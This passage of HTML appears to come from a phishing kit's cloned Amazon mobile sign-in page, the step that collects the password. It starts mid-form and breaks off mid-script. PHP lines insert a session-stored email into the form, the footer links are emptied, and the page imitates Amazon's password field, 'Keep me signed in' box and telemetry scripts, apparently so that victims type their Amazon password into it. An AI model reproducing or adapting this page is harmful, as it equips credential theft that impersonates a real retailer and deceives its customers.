    <input type="hidden" name="workflowState" value="eyJ6aXAiOiJERUYiLCJlbmMiOiJBMjU2R0NNIiwiYWxnIjoiQTI1NktXIn0.5ZtugmXiLCrKrza8cqrukwHlZQBSCjctOWxSSReYvRM4W2ix_cioTA.gmFF0v3vPmWUkIDB.KX6vbWG3FWjRK3uhjHPJDjvxY3oif9Eh16Q_RIwASo6TpXRuAGyHwZKkIavRfxyHzxzUEi0ovUJJVvpEtgTQ2mzbqqyPHtOPrdQWbtfZtugcCknxAXzvryahUSmMI1-mnRGjFTl0j5owoSdz1lS1K24N02aSNx59P-_lDtsXk69f5xFNFk4HJIJJmkmHHiACwqvPRoP3S9FH8WWBTDAPhgPoFPFMAcYCAPOAz21MfJGu_VzH-md2Y1aCZyoqt_9OWuhdNmcjrnAhPH9U4QloannlFZbrPMQRi0TOLb00xAcBXj5njx0SlnaujCPYEcGwicksy9l8HYZlEWc0Wu65DEbX7i8F43xTyil7PwgjPtYF3qNG8_5wA_XJRH1OakpnWOKsnWakFKOHXcBOd2g16z8j67fCkBFATBymh1N66occi1o7Oy7cWqYA0iC3VxXy6qc-PSerp6KxQ_2NEC6RHXdnOdOXHBEo9v9beYY7uHPOOq9L1SM3amzelUk-pE-pFdX3G7aBkriHfqrhqWlGYXkCvALPhfBcGwrwUA.hP4ul4iHQ8gla2aLFTjdrQ">
  



  

  
  <input type="hidden" name="email" value="<?php echo $_SESSION['email'];?>">
  <div data-claim="<?php echo $_SESSION['email'];?>" class="a-input-text-wrapper hide"><input type="text" value="<?php echo $_SESSION['email'];?>" id="ap-credential-autofill-hint" autocomplete="email" name="email"></div>

  
    
    
      <div class="a-input-text-group a-spacing-medium a-spacing-top-micro">
        




        








<script type="a-state" data-a-state="{&quot;key&quot;:&quot;auth-show-password&quot;}">{"isShowPasswordEnabled":true,"showPasswordChecked":true}</script>




  
  
    
  


  
  
    
  


<label for="ap_password" class="a-form-label auth-mobile-label">
  Amazon password
</label>

<div id="auth-password-container" class="a-input-text-wrapper auth-required-field auth-password-container auth-password auth-fill-password"><input type="password" maxlength="1024" id="ap_password" placeholder="Amazon password" name="password" tabindex="2"><div class="a-row auth-visible-password-container auth-show-password-empty">
    <span class="a-size-small a-color-secondary auth-visible-password"></span>
  </div></div>





<div id="ap_password_icon" class="auth-clear-icons" style="display: none;">
  

  <i class="a-icon a-icon-close" role="img" aria-label="Clear password text field, button"></i>

</div>




<div id="auth-password-missing-alert" class="a-box a-alert-inline a-alert-inline-error auth-inlined-error-message a-spacing-top-mini" aria-live="assertive" role="alert"><div class="a-box-inner a-alert-container"><i class="a-icon a-icon-alert"></i><div class="a-alert-content">
  Enter your password
</div></div></div>



  
  

  <input type="hidden" name="showPasswordChecked" value="true" id="ap_show_password_checked">



  

<input type="hidden" name="encryptedPasswordExpected">
<script type="a-state" data-a-state="{&quot;key&quot;:&quot;sif-encryption-profile&quot;}">{"sifProfile":"AuthenticationPortalSigninNA"}</script>

<script type="text/javascript" async="" src="https://static.siege-amazon.com/prod/profiles/AuthenticationPortalSigninNA.js">
</script>


      </div>
    
  

  <div class="a-row">
    
      
        <div class="a-column a-span6 a-spacing-medium">
          <div id="auth-show-password-checkbox-container" class="a-checkbox a-checkbox-fancy a-control-row a-touch-checkbox auth-show-password-checkbox"><label for="auth-signin-show-password-checkbox"><input id="auth-signin-show-password-checkbox" type="checkbox" name="" value="" checked="" tabindex="3"><i class="a-icon a-icon-checkbox"></i><span class="a-label a-checkbox-label">
            Show password
          </span></label></div>
        </div>
      
    
    
      <div class="a-column a-span6 a-text-right a-spacing-none a-spacing-top-small a-span-last">
        <a id="auth-fpp-link-bottom" class="a-spacing-none a-link-normal" tabindex="8" href="https://www.amazon.com/ap/forgotpassword?showRememberMe=true&amp;showRmrMe=0&amp;openid.pape.max_auth_age=0&amp;openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&amp;siteState=isRegularCheckout.1%7CIMBMsgs.%7CisRedirect.1&amp;pageId=anywhere_us&amp;openid.return_to=https%3A%2F%2Fwww.amazon.com%2Fgp%2Fbuy%2Fsignin%2Fhandlers%2Fcontinue.html%3Fie%3DUTF8%26brandId%3D%26cartItemIds%3D%26eGCApp%3D%26hasWorkingJavascript%3D0%26isEGCOrder%3D0%26isFresh%3D%26oldCustomerId%3D0%26oldPurchaseId%3D%26preInitiateCustomerId%3D%26purchaseInProgress%3D%26ref_%3Dcart_signin_submit%26siteDesign%3D&amp;prevRID=VSZ4ZGX2EWQ1W9SH2WX0&amp;openid.assoc_handle=anywhere_us&amp;openid.mode=checkid_setup&amp;openid.ns.pape=http%3A%2F%2Fspecs.openid.net%2Fextensions%2Fpape%2F1.0&amp;prepopulatedLoginId=eyJjaXBoZXIiOiJUTUloQ1VHeVppcjRuUkpXK2lJM0l2bFJ6cnk5dGZ2bnY0eGFaRU52SGJFPSIsIklWIjoieUVFT0NiVjltbno0VktHUVozMUJSUT09IiwidmVyc2lvbiI6MX0%3D&amp;failedSignInCount=0&amp;openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&amp;openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&amp;suppressSignInRadioButtons=0&amp;timestamp=1622947981000">
          Forgot password?
        </a>
      </div>
    
  </div>

  <div class="a-row a-spacing-base">
    






  <div data-a-input-name="rememberMe" class="a-checkbox a-checkbox-fancy a-control-row a-touch-checkbox"><label><input type="checkbox" name="rememberMe" value="true" tabindex="4"><i class="a-icon a-icon-checkbox"></i><span class="a-label a-checkbox-label">
    Keep me signed in.
    <span class="a-declarative" data-action="a-modal" data-a-modal="{&quot;max-width&quot;:&quot;500px&quot;,&quot;width&quot;:&quot;95%&quot;,&quot;name&quot;:&quot;remember-me-detail-link-modal&quot;,&quot;header&quot;:&quot;\&quot;Keep Me Signed In\&quot; Checkbox&quot;}">
      <a id="remember_me_learn_more_link" class="a-link-normal" href="#">
        Details
      </a>
    </span>

    <div class="a-popover-preload" id="a-popover-remember-me-detail-link-modal">
      <div class="a-section a-spacing-large a-spacing-top-mini">
        <p>
          </p><p>Choosing "Keep me signed in" reduces the number of times you're asked to Sign-In on this device.</p>
<p>To keep your account secure, use this option only on your personal devices.</p>
        <p></p>
      </div>
    </div>
  </span></label></div>


  </div>

  <div class="a-row">
    







  </div>

  <span id="auth-signin-button" class="a-button a-button-span12 a-button-primary auth-disable-button-on-submit"><span class="a-button-inner"><input id="signInSubmit" name="signInd" tabindex="6" class="a-button-input" type="submit" aria-labelledby="auth-signin-button-announce"><span id="auth-signin-button-announce" class="a-button-text" aria-hidden="true">
    Sign-In
  </span></span></span>
  
<script>
  function cf() {
    if (typeof window.uet === 'function') {
      uet('cf');
    }
    if (window.embedNotification &&
      typeof window.embedNotification.onCF === 'function') {
      embedNotification.onCF();
    }
  }
</script>

<script type="text/javascript">cf()</script>


  

  
  
</form>

  






  











      </div>

      
      
  <!-- NAVYAAN FOOTER START -->

<footer class="nav-mobile nav-ftr-batmobile">
  
  <div id="nav-ftr" class="nav-t-footer-basicNoAuth nav-sprite-v3">
    
    
    
    
    
    
    
<ul class="nav-ftr-horiz">
    <li class="nav-li">
      <a href="" class="nav-a">Conditions of Use</a>
    </li>
    <li class="nav-li">
      <a href="" class="nav-a">Privacy Notice</a>
    </li>
    <li class="nav-li">
      <a href="" class="nav-a">Interest-Based Ads</a>
    </li>
</ul>

<div id="nav-ftr-copyright">
© 1996-2021, Amazon.com, Inc. or its affiliates
</div>

  </div>
</footer>

<div id="sis_pixel_r2" aria-hidden="true" style="height:1px; position: absolute; left: -1000000px; top: -1000000px;"><iframe id="DAsis" src="//s.amazon-adsystem.com/iu3?d=amazon.com&amp;slot=navFooter&amp;a2=010127a34cad603c075fcb45264837fb4bace973f8564ed590c22f4012a0bd1143b2&amp;old_oo=0&amp;ts=1622947990950&amp;s=AfFak7zcskL6TwBHrZ5O0W7XM9rqxCCaB3840gonGdA8&amp;cb=1622947990950" width="1" height="1" frameborder="0" marginwidth="0" marginheight="0" scrolling="no"></iframe></div><script>(function(a,b){a.attachEvent?a.attachEvent("onload",b):a.addEventListener&&a.addEventListener("load",b,!1)})(window,function(){setTimeout(function(){var el=document.getElementById("sis_pixel_r2");el&&(el.innerHTML='<iframe id="DAsis" src="//s.amazon-adsystem.com/iu3?d=amazon.com&slot=navFooter&a2=010127a34cad603c075fcb45264837fb4bace973f8564ed590c22f4012a0bd1143b2&old_oo=0&ts=1622947990950&s=AfFak7zcskL6TwBHrZ5O0W7XM9rqxCCaB3840gonGdA8&cb=1622947990950" width="1" height="1" frameborder="0" marginwidth="0" marginheight="0" scrolling="no"></iframe>')},300)});</script>

  <!-- NAVYAAN FOOTER END -->

      
      <!-- NAVYAAN BTF START -->

<script type="text/javascript">
    var component = 'navCF';
    try {
      (window.AmazonUIPageJS ? AmazonUIPageJS : P).register(component, function(){return {};});
    }
    catch(e) {
      var error = e.message.toLowerCase();
      var alreadyRegisteredMsg = component + ' already registered';

      if (error.indexOf(alreadyRegisteredMsg.toLowerCase()) === -1) {
        throw(e);
      }
    }
</script>


    








<script type="text/javascript">
    window.$Nav && $Nav.when('$').run('CBIMarketplaceRedirectOverlay', function($) {
            $.ajax({
                type: 'POST',
                url: '/cross_border_interstitial/render',
                data: JSON.stringify({
                    marketplaceId: 'ATVPDKIKX0DER',
                    localCountryCode: 'US',
                    customerId: null,
                    sessionId: '144-8202436-4876725',
                    deviceType: 'MOBILE',
                    referrer: '/',
                    url: '/ap/signin',
                    pageType: 'Standard',
                    languageOfPreference: 'en_US',
                    weblabTreatmentMap: {"CROSS_BORDER_INTERSTITIAL_ES_US_340017":"C","NARX_INTERSTITIAL_BUTTON_BACKGROUND_HIGHLIGHT_329086":"C","NARX_INTERSTITIAL_USE_SPECIAL_TEXT_PD_357221":"T1","CROSS_BORDER_INTERSTITIAL_MX_US_341718":"C","NARX_INTERSTITIAL_ENABLE_CORAL_CLIENT_TIMEOUT_355189":"C","NARX_INTERSTITIAL_MOBILE_DP_REDIRECTION_336249":"T1","CBI_355055":"C","CROSS_BORDER_INTERSTITIAL_EG_302080":"C","NARX_INTERSTITIAL_DP_REDIRECTION_320915":"T1","NARX_GOLDBOX_REDIRECTION_319969":"T1","CROSS_BORDER_INTERSTITIAL_SEARCH_REDIRECTION_355157":"C","NARX_INTERSTITIAL_LOCAL_CONFIG_354049":"T1","CROSS_BORDER_INTERSTITIAL_FR_CA_332704":"C"}
                }),
                contentType: "application/json",
                dataType: "html",
                success: function(data) {
                    if (data) {
                        $('body').append(data);
                    }
                }
            });
    });
</script>


    
    
    















<form style="display: none;">
  <input type="hidden" id="rwol-display-called" value="0">
</form>

    <script type="a-state" data-a-state="{&quot;key&quot;:&quot;rw-dynamic-modal-bootstrap&quot;}">{"origSessionId":"144-8202436-4876725","subPageType":null,"pageType":"Standard","ASIN":null,"path":"/ap/signin","isAUI":"1"}</script>
      

      
<script>
(window.AmazonUIPageJS ? AmazonUIPageJS : P).when('navCF').execute(function(){
  (window.AmazonUIPageJS ? AmazonUIPageJS : P).load.js('https://images-na.ssl-images-amazon.com/images/I/11VbV%2B%2BKhQL.js?AUIClients/RetailWebsiteOverlayAUIAssets');
});
</script>




<!-- NAVYAAN BTF END -->
    </div>

    

<script type="text/javascript">
  try {
    var metadataList = document.getElementsByName('metadata1');
    if (metadataList.length == 0) {
      var input = document.createElement('input');
      input.name = 'metadata1';
      input.type = 'hidden';
      input.value = 'true';

      var authenticationFormList = document.getElementsByName('signIn');
      for (var index = 0; index < authenticationFormList.length; index++) {
        authenticationFormList[index].appendChild(input);
      }
    } else {
      for (var index = 0; index < metadataList.length; index++) {
        metadataList[index].value = 'true';
      }
    }
  } catch (e) {
    if (typeof window.ueLogError === 'function') {
      window.ueLogError(e, {
        message: 'Failed to populate default metadata value',
        logLevel: 'warn',
        attribution: 'FWCIMAssets'
      });
    }
  }
</script>
<script type="text/javascript">
    window.fwcimCmd = [
        
            ['profile', 'signIn']
            
        
    ];
</script>

   

<!-- cache slot rendered -->

  </div><div id="be" style="display:none;visibility:hidden;"><form name="ue_backdetect" action="get"><input type="hidden" name="ue_back" value="2"></form>


<script type="text/javascript">
window.ue_ibe = (window.ue_ibe || 0) + 1;
if (window.ue_ibe === 1) {
(function(e,c){function h(b,a){f.push([b,a])}function g(b,a){if(b){var c=e.head||e.getElementsByTagName("head")[0]||e.documentElement,d=e.createElement("script");d.async="async";d.src=b;d.setAttribute("crossorigin","anonymous");a&&a.onerror&&(d.onerror=a.onerror);a&&a.onload&&(d.onload=a.onload);c.insertBefore(d,c.firstChild)}}function k(){ue.uels=g;for(var b=0;b<f.length;b++){var a=f[b];g(a[0],a[1])}ue.deffered=1}var f=[];c.ue&&(ue.uels=h,c.ue.attach&&c.ue.attach("load",k))})(document,window);


if (window.ue && window.ue.uels) {
            ue.uels("https://images-na.ssl-images-amazon.com/images/I/31YXrY93hfL.js");
}
var ue_mbl=ue_csm.ue.exec(function(e,a){function m(g){b=g||{};a.AMZNPerformance=b;b.transition=b.transition||{};b.timing=b.timing||{};if(a.csa){var c;b.timing.transitionStart&&(c=b.timing.transitionStart);b.timing.processStart&&(c=b.timing.processStart);c&&(csa("PageTiming")("mark","nativeTransitionStart",c),csa("PageTiming")("mark","transitionStart",c))}e.ue.exec(n,"csm-android-check")()&&b.tags instanceof Array&&(g=-1!=b.tags.indexOf("usesAppStartTime")||b.transition.type?!b.transition.type&&-1<
b.tags.indexOf("usesAppStartTime")?"warm-start":void 0:"view-transition",g&&(b.transition.type=g));"reload"===f._nt&&e.ue_orct||"intrapage-transition"===f._nt?d&&d.timing&&d.timing.navigationStart?b.timing.transitionStart=d.timing.navigationStart:delete b.timing.transitionStart:"undefined"===typeof f._nt&&d&&d.timing&&d.timing.navigationStart&&a.history&&"function"===typeof a.History&&"object"===typeof a.history&&a.history.length&&1!=a.history.length&&(b.timing.transitionStart=d.timing.navigationStart);
g=b.transition;c=f._nt?f._nt:void 0;g.subType=c;a.ue&&a.ue.tag&&a.ue.tag("has-AMZNPerformance");f.isl&&a.uex&&a.uex("at","csm-timing");p()}function q(b){a.ue&&a.ue.count&&a.ue.count("csm-cordova-plugin-failed",1)}function n(){return a.cordova&&a.cordova.platformId&&"android"==a.cordova.platformId}function p(){try{a.P.register("AMZNPerformance",function(){return b})}catch(g){}}function k(){if(!b)return"";ue_mbl.cnt=null;for(var a=b.timing,c=b.transition,a=["mts",l(a.transitionStart),"mps",l(a.processStart),
"mtt",c.type,"mtst",c.subType,"mtlt",c.launchType],c="",d=0;d<a.length;d+=2){var f=a[d],e=a[d+1];"undefined"!==typeof e&&(c+="&"+f+"="+e)}return c}function l(a){if("undefined"!==typeof a&&"undefined"!==typeof h)return a-h}function r(a,c){b&&(h=c,b.timing.transitionStart=a,b.transition.type="view-transition",b.transition.subType="ajax-transition",b.transition.launchType="normal",ue_mbl.cnt=k)}var f=e.ue||{},h=e.ue_t0,d=a.performance,b;if(a.P&&a.P.when&&a.P.register)return 1===a.ue_fnt&&(h=a.aPageStart||
e.ue_t0),a.P.when("CSMPlugin").execute(function(a){a.buildAMZNPerformance&&a.buildAMZNPerformance({successCallback:m,failCallback:q})}),{cnt:k,ajax:r}},"mobile-timing")(ue_csm,ue_csm.window);

(function(d){d._uess=function(){var a="";screen&&screen.width&&screen.height&&(a+="&sw="+screen.width+"&sh="+screen.height);var b=function(a){var b=document.documentElement["client"+a];return"CSS1Compat"===document.compatMode&&b||document.body["client"+a]||b},c=b("Width"),b=b("Height");c&&b&&(a+="&vw="+c+"&vh="+b);return a}})(ue_csm);

(function(a){var b=document.ue_backdetect;b&&b.ue_back&&a.ue&&(a.ue.bfini=b.ue_back.value);a.uet&&a.uet("be");a.onLdEnd&&(window.addEventListener?window.addEventListener("load",a.onLdEnd,!1):window.attachEvent&&window.attachEvent("onload",a.onLdEnd));a.ueh&&a.ueh(0,window,"load",a.onLd,1);a.ue&&a.ue.tag&&(a.ue_furl?(b=a.ue_furl.replace(/\./g,"-"),a.ue.tag(b)):a.ue.tag("nofls"))})(ue_csm);

(function(g,h){function d(a,d){var b={};if(!e||!f)try{var c=h.sessionStorage;c?a&&("undefined"!==typeof d?c.setItem(a,d):b.val=c.getItem(a)):f=1}catch(g){e=1}e&&(b.e=1);return b}var b=g.ue||{},a="",f,e,c,a=d("csmtid");f?a="NA":a.e?a="ET":(a=a.val,a||(a=b.oid||"NI",d("csmtid",a)),c=d(b.oid),c.e||(c.val=c.val||0,d(b.oid,c.val+1)),b.ssw=d);b.tabid=a})(ue_csm,ue_csm.window);

ue_csm.ue.exec(function(e,f){var a=e.ue||{},b=a._wlo,d;if(a.ssw){d=a.ssw("CSM_previousURL").val;var c=f.location,b=b?b:c&&c.href?c.href.split("#")[0]:void 0;c=(b||"")===a.ssw("CSM_previousURL").val;!c&&b&&a.ssw("CSM_previousURL",b);d=c?"reload":d?"intrapage-transition":"first-view"}else d="unknown";a._nt=d},"NavTypeModule")(ue_csm,window);
ue_csm.ue.exec(function(c,a){function g(a){a.run(function(e){d.tag("csm-feature-"+a.name+":"+e);d.isl&&c.uex("at")})}if(a.addEventListener)for(var d=c.ue||{},f=[{name:"touch-enabled",run:function(b){var e=function(){a.removeEventListener("touchstart",c,!0);a.removeEventListener("mousemove",d,!0)},c=function(){b("true");e()},d=function(){b("false");e()};a.addEventListener("touchstart",c,!0);a.addEventListener("mousemove",d,!0)}}],b=0;b<f.length;b++)g(f[b])},"csm-features")(ue_csm,window);


(function(b,c){var a=c.images;a&&a.length&&b.ue.count("totalImages",a.length)})(ue_csm,document);
(function(b){function c(){var d=[];a.log&&a.log.isStub&&a.log.replay(function(a){e(d,a)});a.clog&&a.clog.isStub&&a.clog.replay(function(a){e(d,a)});d.length&&(a._flhs+=1,n(d),p(d))}function g(){a.log&&a.log.isStub&&(a.onflush&&a.onflush.replay&&a.onflush.replay(function(a){a[0]()}),a.onunload&&a.onunload.replay&&a.onunload.replay(function(a){a[0]()}),c())}function e(d,b){var c=b[1],f=b[0],e={};a._lpn[c]=(a._lpn[c]||0)+1;e[c]=f;d.push(e)}function n(b){q&&(a._lpn.csm=(a._lpn.csm||0)+1,b.push({csm:{k:"chk",
f:a._flhs,l:a._lpn,s:"inln"}}))}function p(a){if(h)a=k(a),b.navigator.sendBeacon(l,a);else{a=k(a);var c=new b[f];c.open("POST",l,!0);c.setRequestHeader&&c.setRequestHeader("Content-type","text/plain");c.send(a)}}function k(a){return JSON.stringify({rid:b.ue_id,sid:b.ue_sid,mid:b.ue_mid,mkt:b.ue_mkt,sn:b.ue_sn,reqs:a})}var f="XMLHttpRequest",q=1===b.ue_ddq,a=b.ue,r=b[f]&&"withCredentials"in new b[f],h=b.navigator&&b.navigator.sendBeacon,l="//"+b.ue_furl+"/1/batch/1/OE/",m=b.ue_fci_ft||5E3;a&&(r||h)&&
(a._flhs=a._flhs||0,a._lpn=a._lpn||{},a.attach&&(a.attach("beforeunload",a.exec(g,"fcli-bfu")),a.attach("pagehide",a.exec(g,"fcli-ph"))),m&&b.setTimeout(a.exec(c,"fcli-t"),m),a._ffci=a.exec(c))})(window);


(function(k,c){function l(a,b){return a.filter(function(a){return a.initiatorType==b})}function f(a,c){if(b.t[a]){var g=b.t[a]-b._t0,e=c.filter(function(a){return 0!==a.responseEnd&&m(a)<g}),f=l(e,"script"),h=l(e,"link"),k=l(e,"img"),n=e.map(function(a){return a.name.split("/")[2]}).filter(function(a,b,c){return a&&c.lastIndexOf(a)==b}),q=e.filter(function(a){return a.duration<p}),s=g-Math.max.apply(null,e.map(m))<r|0;"af"==a&&(b._afjs=f.length);return a+":"+[e[d],f[d],h[d],k[d],n[d],q[d],s].join("-")}}
function m(a){return a.responseEnd-(b._t0-c.timing.navigationStart)}function n(){var a=c[h]("resource"),d=f("cf",a),g=f("af",a),a=f("ld",a);delete b._rt;b._ld=b.t.ld-b._t0;b._art&&b._art();return[d,g,a].join("_")}var p=20,r=50,d="length",b=k.ue,h="getEntriesByType";b._rre=m;b._rt=c&&c.timing&&c[h]&&n})(ue_csm,window.performance);


(function(c,d){var b=c.ue,a=d.navigator;b&&b.tag&&a&&(a=a.connection||a.mozConnection||a.webkitConnection)&&a.type&&b.tag("netInfo:"+a.type)})(ue_csm,window);


(function(c,d){function h(a,b){for(var c=[],d=0;d<a.length;d++){var e=a[d],f=b.encode(e);if(e[k]){var g=b.metaSep,e=e[k],l=b.metaPairSep,h=[],m=void 0;for(m in e)e.hasOwnProperty(m)&&h.push(m+"="+e[m]);e=h.join(l);f+=g+e}c.push(f)}return c.join(b.resourceSep)}function s(a){var b=a[k]=a[k]||{};b[t]||(b[t]=c.ue_mid);b[u]||(b[u]=c.ue_sid);b[f]||(b[f]=c.ue_id);b.csm=1;a="//"+c.ue_furl+"/1/"+a[v]+"/1/OP/"+a[w]+"/"+a[x]+"/"+h([a],y);if(n)try{n.call(d[p],a)}catch(g){c.ue.sbf=1,(new Image).src=a}else(new Image).src=
a}function q(){g&&g.isStub&&g.replay(function(a,b,c){a=a[0];b=a[k]=a[k]||{};b[f]=b[f]||c;s(a)});l.impression=s;g=null}if(!(1<c.ueinit)){var k="metadata",x="impressionType",v="foresterChannel",w="programGroup",t="marketplaceId",u="session",f="requestId",p="navigator",l=c.ue||{},n=d[p]&&d[p].sendBeacon,r=function(a,b,c,d){return{encode:d,resourceSep:a,metaSep:b,metaPairSep:c}},y=r("","?","&",function(a){return h(a.impressionData,z)}),z=r("/",":",",",function(a){return a.featureName+":"+h(a.resources,
A)}),A=r(",","@","|",function(a){return a.id}),g=l.impression;n?q():(l.attach("load",q),l.attach("beforeunload",q));try{d.P&&d.P.register&&d.P.register("impression-client",function(){})}catch(B){c.ueLogError(B,{logLevel:"WARN"})}}})(ue_csm,window);



var ue_pty = "AuthenticationPortal";

var ue_spty = "SignInPwdCollect";



var ue_adb = 4;
var ue_adb_rtla = 1;
ue_csm.ue.exec(function(y,a){function t(){if(d&&f){var a;a:{try{a=d.getItem(g);break a}catch(c){}a=void 0}if(a)return b=a,!0}return!1}function u(){if(a.fetch)fetch(m).then(function(a){if(!a.ok)throw Error(a.statusText);return a.text?a.text():null}).then(function(b){b?(-1<b.indexOf("window.ue_adb_chk = 1")&&(a.ue_adb_chk=1),n()):h()})["catch"](h);else e.uels(m,{onerror:h,onload:n})}function h(){b=k;l();if(f)try{d.setItem(g,b)}catch(a){}}function n(){b=1===a.ue_adb_chk?p:k;l();if(f)try{d.setItem(g,
b)}catch(c){}}function q(){a.ue_adb_rtla&&c&&0<c.ec&&!1===r&&(c.elh=null,ueLogError({m:"Hit Info",fromOnError:1},{logLevel:"INFO",adb:b}),r=!0)}function l(){e.tag(b);e.isl&&a.uex&&uex("at",b);s&&s.updateCsmHit("adb",b);c&&0<c.ec?q():a.ue_adb_rtla&&c&&(c.elh=q)}function v(){return b}if(a.ue_adb){a.ue_fadb=a.ue_fadb||10;var e=a.ue,k="adblk_yes",p="adblk_no",m="https://m.media-amazon.com/images/G/01/csm/showads.v2.js?adtag=csm&act=ads_",b="adblk_unk",d;a:{try{d=a.localStorage;break a}catch(z){}d=void 0}var g=
"csm:adb",c=a.ue_err,s=e.cookie,f=void 0!==a.localStorage,w=Math.random()>1-1/a.ue_fadb,r=!1,x=t();w||!x?u():l();a.ue_isAdb=v;a.ue_isAdb.unk="adblk_unk";a.ue_isAdb.no=p;a.ue_isAdb.yes=k}},"adb")(document,window);




(function(c,l,m){function h(a){if(a)try{if(a.id)return"//*[@id='"+a.id+"']";var b,d=1,e;for(e=a.previousSibling;e;e=e.previousSibling)e.nodeName===a.nodeName&&(d+=1);b=d;var c=a.nodeName;1!==b&&(c+="["+b+"]");a.parentNode&&(c=h(a.parentNode)+"/"+c);return c}catch(f){return"DETACHED"}}function f(a){if(a&&a.getAttribute)return a.getAttribute(k)?a.getAttribute(k):f(a.parentElement)}var k="data-cel-widget",g=!1,d=[];(c.ue||{}).isBF=function(){try{var a=JSON.parse(localStorage["csm-bf"]||"[]"),b=0<=a.indexOf(c.ue_id);
a.unshift(c.ue_id);a=a.slice(0,20);localStorage["csm-bf"]=JSON.stringify(a);return b}catch(d){return!1}}();c.ue_utils={getXPath:h,getFirstAscendingWidget:function(a,b){c.ue_cel&&c.ue_fem?!0===g?b(f(a)):d.push({element:a,callback:b}):b()},notifyWidgetsLabeled:function(){if(!1===g){g=!0;for(var a=f,b=0;b<d.length;b++)if(d[b].hasOwnProperty("callback")&&d[b].hasOwnProperty("element")){var c=d[b].callback,e=d[b].element;"function"===typeof c&&"function"===typeof a&&c(a(e))}d=null}},extractStringValue:function(a){if("string"===
typeof a)return a}}})(ue_csm,window,document);





ue_csm.ue_unrt = 1500;
(function(d,b,t){function u(a,g){var c=a.srcElement||a.target||{},b={k:v,t:g.t,dt:g.dt,x:a.pageX,y:a.pageY,p:e.getXPath(c),n:c.nodeName};a.button&&(b.b=a.button);c.type&&(b.ty=c.type);c.href&&(b.r=e.extractStringValue(c.href));c.id&&(b.i=c.id);c.className&&c.className.split&&(b.c=c.className.split(/\s+/));h+=1;e.getFirstAscendingWidget(c,function(a){b.wd=a;d.ue.log(b,r)})}function w(a){if(!x(a.srcElement||a.target)){m+=1;n=!0;var g=f=d.ue.d(),c;p&&"function"===typeof p.now&&a.timeStamp&&(c=p.now()-
a.timeStamp,c=parseFloat(c.toFixed(2)));s=b.setTimeout(function(){u(a,{t:g,dt:c})},y)}}function z(a){if(a){var b=a.filter(A);a.length!==b.length&&(q=!0,k=d.ue.d(),n&&q&&(k&&f&&d.ue.log({k:B,t:f,m:Math.abs(k-f)},r),l(),q=!1,k=0))}}function A(a){if(!a)return!1;var b="characterData"===a.type?a.target.parentElement:a.target;if(!b||!b.hasAttributes||!b.attributes)return!1;var c={"class":"gw-clock gw-clock-aria s-item-container-height-auto feed-carousel using-mouse kfs-inner-container".split(" "),id:["dealClock",
"deal_expiry_timer","timer"],role:["timer"]},d=!1;Object.keys(c).forEach(function(a){var e=b.attributes[a]?b.attributes[a].value:"";(c[a]||"").forEach(function(a){-1!==e.indexOf(a)&&(d=!0)})});return d}function x(a){if(!a)return!1;var b=(e.extractStringValue(a.nodeName)||"").toLowerCase(),c=(e.extractStringValue(a.type)||"").toLowerCase(),d=(e.extractStringValue(a.href)||"").toLowerCase();a=(e.extractStringValue(a.id)||"").toLowerCase();var f="checkbox color date datetime-local email file month number password radio range reset search tel text time url week".split(" ");
if(-1!==["select","textarea","html"].indexOf(b)||"input"===b&&-1!==f.indexOf(c)||"a"===b&&-1!==d.indexOf("http")||-1!==["sitbreaderrightpageturner","sitbreaderleftpageturner","sitbreaderpagecontainer"].indexOf(a))return!0}function l(){n=!1;f=0;b.clearTimeout(s)}function C(){b.ue.onunload(function(){ue.count("armored-cxguardrails.unresponsive-clicks.violations",h);ue.count("armored-cxguardrails.unresponsive-clicks.violationRate",h/m*100||0)})}if(b.MutationObserver&&b.addEventListener&&Object.keys&&
d&&d.ue&&d.ue.log&&d.ue_unrt&&d.ue_utils){var y=d.ue_unrt,r="cel",v="unr_mcm",B="res_mcm",p=b.performance,e=d.ue_utils,n=!1,f=0,s=0,q=!1,k=0,h=0,m=0;b.addEventListener&&(b.addEventListener("mousedown",w,!0),b.addEventListener("beforeunload",l,!0),b.addEventListener("visibilitychange",l,!0),b.addEventListener("pagehide",l,!0));b.ue&&b.ue.event&&b.ue.onSushiUnload&&b.ue.onunload&&C();(new MutationObserver(z)).observe(t,{childList:!0,attributes:!0,characterData:!0,subtree:!0})}})(ue_csm,window,document);


ue_csm.ue.exec(function(g,e){if(e.ue_err){var f="";e.ue_err.errorHandlers||(e.ue_err.errorHandlers=[]);e.ue_err.errorHandlers.push({name:"fctx",handler:function(a){if(!a.logLevel||"FATAL"===a.logLevel)if(f=g.getElementsByTagName("html")[0].innerHTML){var b=f.indexOf("var ue_t0=ue_t0||+new Date();");if(-1!==b){var b=f.substr(0,b).split(String.fromCharCode(10)),d=Math.max(b.length-10-1,0),b=b.slice(d,b.length-1);a.fcsmln=d+b.length+1;a.cinfo=a.cinfo||{};for(var c=0;c<b.length;c++)a.cinfo[d+c+1+""]=
b[c]}b=f.split(String.fromCharCode(10));a.cinfo=a.cinfo||{};if(!(a.f||void 0===a.l||a.l in a.cinfo))for(c=+a.l-1,d=Math.max(c-5,0),c=Math.min(c+5,b.length-1);d<=c;d++)a.cinfo[d+1+""]=b[d]}}})}},"fatals-context")(document,window);


(function(m,a){function c(k){function f(b){b&&"string"===typeof b&&(b=(b=b.match(/^(?:https?:)?\/\/(.*?)(\/|$)/i))&&1<b.length?b[1]:null,b&&b&&("number"===typeof e[b]?e[b]++:e[b]=1))}function d(b){var e=10,d=+new Date;b&&b.timeRemaining?e=b.timeRemaining():b={timeRemaining:function(){return Math.max(0,e-(+new Date-d))}};for(var c=a.performance.getEntries(),k=e;g<c.length&&k>n;)c[g].name&&f(c[g].name),g++,k=b.timeRemaining();g>=c.length?h(!0):l()}function h(b){if(!b){b=m.scripts;var c;if(b)for(var d=
0;d<b.length;d++)(c=b[d].getAttribute("src"))&&"undefined"!==c&&f(c)}0<Object.keys(e).length&&(p&&ue_csm.ue&&ue_csm.ue.event&&ue_csm.ue.event({domains:e,pageType:a.ue_pty||null,subPageType:a.ue_spty||null,pageTypeId:a.ue_pti||null},"csm","csm.CrossOriginDomains.2"),a.ue_ext=e)}function l(){!0===k?d():a.requestIdleCallback?a.requestIdleCallback(d):a.requestAnimationFrame?a.requestAnimationFrame(d):a.setTimeout(d,100)}function c(){if(a.performance&&a.performance.getEntries){var b=a.performance.getEntries();
